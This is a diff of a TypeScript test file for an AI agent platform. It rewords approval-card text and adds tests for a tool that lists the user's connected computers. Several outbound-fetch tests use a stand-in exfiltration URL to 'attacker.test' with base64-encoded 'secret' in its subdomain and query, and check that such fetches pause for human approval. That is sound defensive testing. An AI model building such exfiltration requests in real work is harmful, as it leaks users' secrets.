@@ -1673,8 +1673,8 @@ describe("Composio batches", () => {
       f.pauseRunForInput.mock.calls as unknown as [{ blocks: Array<Record<string, unknown>> }][]
     )[0]?.[0].blocks[0];
     expect(card).toMatchObject({
-      text: "Review before GMAIL_SEND_EMAIL, …",
-      detail: "GMAIL_SEND_EMAIL\nto: a@example.com\n…",
+      text: "Allow Gmail send email, …?",
+      detail: "Gmail send email\nTo: a@example.com\n…",
     });
   });
 
@@ -3044,7 +3044,7 @@ describe("routine event approval", () => {
     ]);
     await f.run();
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
-    expect(askDetail(f)).toContain('on: {"webhook":true}');
+    expect(askDetail(f)).toContain('On: {"webhook":true}');
     // The approval is recorded for the same short form the card shows.
     const recorded = f.effects.find((effect) => effect.kind === "schedule_create")?.request;
     expect((recorded as { on?: unknown } | undefined)?.on).toEqual({ webhook: true });
@@ -3251,8 +3251,8 @@ describe("outbound destinations", () => {
     expect(f.fetchedUrls).toEqual(["https://example.com/pricing"]);
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
     expect(pausedCard(f)).toMatchObject({
-      text: "Review before web_fetch → attacker.test",
-      detail: "url: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
+      text: "Allow Web fetch → attacker.test?",
+      detail: "URL: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
       site: "attacker.test",
       actions: [
         { id: "allow", label: "Allow once" },
@@ -3273,7 +3273,7 @@ describe("outbound destinations", () => {
       expect(isApprovalPausedResult(f.results[0])).toBe(true);
       expect(pausedCard(f)).toMatchObject({
         site: "ada.li",
-        detail: "url: https://ada.li/",
+        detail: "URL: https://ada.li/",
       });
     },
   );
@@ -3435,7 +3435,7 @@ describe("outbound destinations", () => {
     await f.run();
     expect(f.fetchedUrls).toEqual([]);
     expect(isApprovalPausedResult(f.results[0])).toBe(true);
-    expect(pausedCard(f)).toMatchObject({ detail: "url: https://attacker.test/?q=c2VjcmV0" });
+    expect(pausedCard(f)).toMatchObject({ detail: "URL: https://attacker.test/?q=c2VjcmV0" });
     expect(f.effects[0]?.request).toEqual({ url: "https://attacker.test/?q=c2VjcmV0" });
   });
 
@@ -4153,6 +4153,7 @@ describe("user_computer_shell", () => {
   function devices(connected = true, paired = connected, pairedAt = new Date(0)) {
     const requests: Array<{ userId: string; request: HostComputerRequest }> = [];
     const gateway = {
+      list: async (): ReturnType<UserDeviceGateway["list"]> => [],
       connected: vi.fn(async (_userId: string) => (connected ? device : null)),
       pairedSince: vi.fn(async (_userId: string) => (paired ? pairedAt : null)),
       async *request<T>(userId: string, request: HostComputerRequest) {
@@ -4184,6 +4185,7 @@ describe("user_computer_shell", () => {
       const f = fixture({ ...ownRun, trigger, userDevices: gateway });
       await f.run();
       expect(f.offeredTools()).toContain("user_computer_shell");
+      expect(f.offeredTools()).toContain("user_computer_list");
       expect(f.instructions()).toContain(line);
       expect(f.instructions()).not.toContain(offlineLine);
     }
@@ -4248,6 +4250,21 @@ describe("user_computer_shell", () => {
     await f.run();
     expect(f.offeredTools()).not.toContain("user_computer_shell");
     expect(f.instructions()).not.toContain(line);
+    expect(f.offeredTools()).not.toContain("user_computer_list");
+  });
+
+  it("lists connected computers without a command approval", async () => {
+    const { gateway, requests } = devices();
+    gateway.list = async () => [
+      { deviceId: device.deviceId, name: device.name, connected: true, bound: true },
+    ];
+    const f = fixture({ ...ownRun, name: "user_computer_list", userDevices: gateway });
+    f.setCalls([{ name: "user_computer_list", args: {}, executionId: "list-1" }]);
+    await f.run();
+    expect(f.results).toEqual([
+      { computers: [{ computerId: device.deviceId, name: device.name, bound: true }] },
+    ]);
+    expect(requests).toEqual([]);
   });
 
   it("refuses a call from a run that may not reach the device without an approval card", async () => {
@@ -4393,6 +4410,7 @@ describe("user computer screen control", () => {
   function devices(platform = "darwin", screenOnly?: boolean) {
     const requests: HostComputerRequest[] = [];
     const gateway = {
+      list: async (): ReturnType<UserDeviceGateway["list"]> => [],
       connected: vi.fn(async (_userId: string) => ({
         deviceId: "device-1",
         name: "Laptop",
@@ -4411,6 +4429,21 @@ describe("user computer screen control", () => {
     } satisfies UserDeviceGateway;
     return { gateway, requests };
   }
+  it("offers screen targeting when a different connected computer supports it", async () => {
+    const { gateway } = devices("linux");
+    gateway.list = async () => [
+      { deviceId: "mac", name: "Laptop", platform: "darwin", connected: true },
+    ];
+    const f = fixture({
+      name: "user_computer_observe",
+      builtin: true,
+      sourceRole: "user",
+      userDevices: gateway,
+    });
+    await f.run();
+    expect(f.offeredTools()).toContain("user_computer_observe");
+  });
+
   const ownRun = { name: "user_computer_observe", builtin: true, sourceRole: "user" };
   const observe = (app: string, executionId = "call-1") => ({
     name: "user_computer_observe",
